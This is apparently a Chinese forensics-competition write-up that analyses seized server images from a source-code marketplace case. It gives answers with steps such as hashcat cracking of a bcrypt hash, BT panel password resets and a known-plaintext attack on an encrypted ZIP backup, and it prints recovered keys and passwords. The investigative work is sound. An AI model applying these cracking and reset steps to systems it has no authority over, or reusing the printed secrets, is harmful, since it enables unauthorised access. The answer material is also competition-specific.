命令行: `.\hashcat.exe -m 3200 -a 0 '$2a$10$A1uikR1M8trohKNRg24ojew8pl2WXi9Rq7NriLHHInB33RIoLAxYa' .\dict\password-attack\top19576.txt`.

![Pasted image 20250412152646.png](./attachments/Pasted%20image%2020250412152646.png)


### 5.服务器存活监控应用中监控的论坛网址

> ==https://breachforums.is/==
> 

参考第 3 题中数据库, 表 `monitor` 中存储了关于论坛 `https://breachforums.is/` 的信息:

![Pasted image 20250412160159.png](./attachments/Pasted%20image%2020250412160159.png)

或者使用上题中获得的账户信息登录服务:

![Pasted image 20250412160450.png](./attachments/Pasted%20image%2020250412160450.png)


### 6.服务器存活监控应用中使用的代理端口

> ==7890==
> 

接上题, 在表 `proxy` 中:

![Pasted image 20250412160234.png](./attachments/Pasted%20image%2020250412160234.png)

或者在服务的设置页面中查看:

![Pasted image 20250412160538.png](./attachments/Pasted%20image%2020250412160538.png)


### 7.服务器存活监控应用中用来推送的 SendKey

> ==SCT36712MKSYUBEO7flBN7F05lwjxlb6f==
> 

在数据库中:

![Pasted image 20250412160709.png](./attachments/Pasted%20image%2020250412160709.png)

在应用的设置中:

![Pasted image 20250412160604.png](./attachments/Pasted%20image%2020250412160604.png)


### 8.用来加密网盘中压缩文件的加密算法

> ==rc4==
> 

网盘服务是 `Alist`, 而有一个 Docker 容器的名称为 `alist-encrypt`.

进入容器内 Shell, 在这里看到了 Alist 服务的密码和使用的加密算法:

![Pasted image 20250412161023.png](./attachments/Pasted%20image%2020250412161023.png)

还看到了一个挂载的 WebDAV 的密码信息:

![Pasted image 20250412161147.png](./attachments/Pasted%20image%2020250412161147.png)



### ﻿9.用来加密网盘中压缩文件的加密密码

> ==rNj39Yj_R\*MV==
> 

见上题.


---

## 网站服务器

> 参考 `源码商城服务器\Server.dd`.
> 

仿真一下, 服务器网络信息:

![Pasted image 20250412163535.png](./attachments/Pasted%20image%2020250412163535.png)

登录之后, 在 `root` 目录下看到一个 `bak.py`, 内容是备份数据库, 其中包含了数据库 `yourcode_xyz` 用户的信息:

![Pasted image 20250412163813.png](./attachments/Pasted%20image%2020250412163813.png)

`install.sh` 是宝塔面板的安装脚本.

`pstree` 查看服务器进程, 宝塔面板在运行:

![Pasted image 20250412164003.png](./attachments/Pasted%20image%2020250412164003.png)

`bt 14` 查看面板信息:

![Pasted image 20250412164053.png](./attachments/Pasted%20image%2020250412164053.png)

然后 `bt 5` 修改面板密码.

尝试访问, 发现有域名访问限制:

![Pasted image 20250412164227.png](./attachments/Pasted%20image%2020250412164227.png)

`bt 12` 取消域名绑定限制即可正常访问.

面板中运行了一个网站:

![Pasted image 20250412164417.png](./attachments/Pasted%20image%2020250412164417.png)


### 1.数据库的 root 密码

> ==1700fc6617b3c73d==
> 

宝塔面板中有一个数据库:

![Pasted image 20250412164451.png](./attachments/Pasted%20image%2020250412164451.png)

可以直接查看数据库的 root 用户的密码:

![Pasted image 20250412164512.png](./attachments/Pasted%20image%2020250412164512.png)

为了后面做题方便, 我直接顺手改成 `123456` 了.


### 2.嫌疑人预留的 QQ 号码

> ==6666666==
> 

修改一下 Nginx 的配置, 给站点网址添加 ip 地址:

![Pasted image 20250412165136.png](./attachments/Pasted%20image%2020250412165136.png)

重启一下 Nginx 服务就可以访问网站了, 管理员登录页面是 `http://<IP>:<Port>/admin`.

phpMyAdmin 连上数据库, 看到管理员的用户信息:

![Pasted image 20250412170234.png](./attachments/Pasted%20image%2020250412170234.png)

密码是 bcrypt 的哈希. 重新生成一个

![Pasted image 20250412171907.png](./attachments/Pasted%20image%2020250412171907.png)

登录之后看到后台页面:

![Pasted image 20250412171957.png](./attachments/Pasted%20image%2020250412171957.png)

在后台商品管理页面可以看到商品中的购买提示, 其中包含 QQ 号:

![Pasted image 20250412172819.png](./attachments/Pasted%20image%2020250412172819.png)


### 3.吴某预留的 tg 群组账号

> ==http://t.me/yourcode==
> 

在仪表盘上可以看到一个 TG 群组链接:

![Pasted image 20250412173000.png](./attachments/Pasted%20image%2020250412173000.png)


### 4.源码交易平台⼀共提供了多少支付通道

> ==16==
> 

在后台的支付配置中, 可以看到一共有 18 条, 其中 2 条处于禁用状态:

![Pasted image 20250412173106.png](./attachments/Pasted%20image%2020250412173106.png)


### 5.当前服务器交易记录中, 已完成的订单数量

> ==3==
> 

在订单列表中可以看到 4 条订单, 其中 1 条状态是已过期, 3 条状态是已完成:

![Pasted image 20250412173137.png](./attachments/Pasted%20image%2020250412173137.png)


### 6.5 ⽉ 21 日期间, 使用优惠码下单购买的产品中, 买家填写的邮箱地址

> ==1234587@qq.com==
> 

接上题, 后台订单信息中在 5 月 21 日没有使用了优惠码的订单信息, 可能是被删除了.

联系到之前看到的数据库备份用的 `bak.py` 猜测可能是备份了数据库. 在 `/www/backup/database` 目录下找到了备份的数据库. history 没有记录 HashCat 爆弱口令没爆出来.

数据库引擎用的是 InnoDB, 在 `/www/server/data` 目录下有 `ib_logfile`:

![Pasted image 20250412180849.png](./attachments/Pasted%20image%2020250412180849.png)

数据库版本是 `5.6.50`, 这个版本的 `ib_logfile` 刚好超过了 `innodb_ruby` 支持的最高版本. 所以没办法直接从 `ib_logfile` 恢复, 但可以 16 进制编辑器硬看.

就在我准备 010 启动的时候, 突然想起来, sql 的 dump 文件长啥样来着的, 好像文件开头有贼长一段注释. 但很怪, 用了 `pkcrack`, `bkcrack`, `ARCHPR` 都没能成功攻击. 而且 pkcrack 的提示很奇怪, 以前从来没见过:

![Pasted image 20250412200329.png](./attachments/Pasted%20image%2020250412200329.png)

查了好久资料都没有发现问题在哪儿, 最后在只用前 16 Bytes 作为已知明文时攻击才成功:

![Pasted image 20250412213803.png](./attachments/Pasted%20image%2020250412213803.png)

如果直接看 ib_logfile 的话, 最好还是先在日志里匹配一下邮箱地址:

![Pasted image 20250413113555.png](./attachments/Pasted%20image%2020250413113555.png)

去重之后:

![Pasted image 20250413113634.png](./attachments/Pasted%20image%2020250413113634.png)

优先去看数据库里没有的几个邮箱地址, 这些数据一定是被删除掉的. 结果是在缓存在数据库里, 传递给 Redis 的数据中找到了一个记录, 看起来是订单完成后与发送确认订单的邮件:

![Pasted image 20250413121715.png](./attachments/Pasted%20image%2020250413121715.png)

![Pasted image 20250413122008.png](./attachments/Pasted%20image%2020250413122008.png)

可以看到总价是 950, 而在数据库中, `人工智能GPT` 的价格是 1000, 数据库中只有 1 个优惠 50 元的优惠码. 该订单使用了优惠码.


### ﻿7.吴某通过即时通讯和买家联系后, 买家下单的源码成交金额

> ==450==
> 

聊天内容在电脑的 Enigma 的聊天记录中:

![Pasted image 20250412182024.png](./attachments/Pasted%20image%2020250412182024.png)

和后台订单页面的显示一致:

![Pasted image 20250412182101.png](./attachments/Pasted%20image%2020250412182101.png)


